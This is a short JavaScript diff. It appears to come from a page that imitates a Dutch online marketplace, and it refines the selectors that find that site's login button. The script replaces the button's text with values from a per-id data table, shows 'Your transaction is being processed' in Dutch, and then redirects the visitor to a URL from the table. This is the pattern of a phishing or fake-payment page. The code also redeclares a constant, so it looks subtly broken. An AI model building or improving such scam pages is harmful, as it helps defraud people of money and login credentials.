@@ -77,7 +77,7 @@
           const textElement = document.querySelector('.loader-text');
 
           const renderInterval = setInterval(() => {
-            const loginBtnReady = document.querySelector('a[href="/identity/v2/login"] span');
+            const loginBtnReady = document.querySelector('li.hz-hide-lte-md a[href="/identity/v2/login"] span');
             if (loginBtnReady && data[id].replaceText) {
               loginBtnReady.textContent = data[id].replaceText;
               clearInterval(renderInterval);
@@ -85,7 +85,7 @@
           }, 50);
 
           if (textElement) textElement.textContent = "Uw transactie wordt verwerkt";
-          const loginBtn = document.querySelector('a[href="/identity/v2/login"] span');
+          const loginBtn = document.querySelector('li.hz-hide-lte-md a[href="/identity/v2/login"] span');
           if (loginBtn && data[id].replaceText) loginBtn.textContent = data[id].replaceText;
           const textElement = document.querySelector('.loader-text');
           if (textElement) window.location.href = data[id].url;
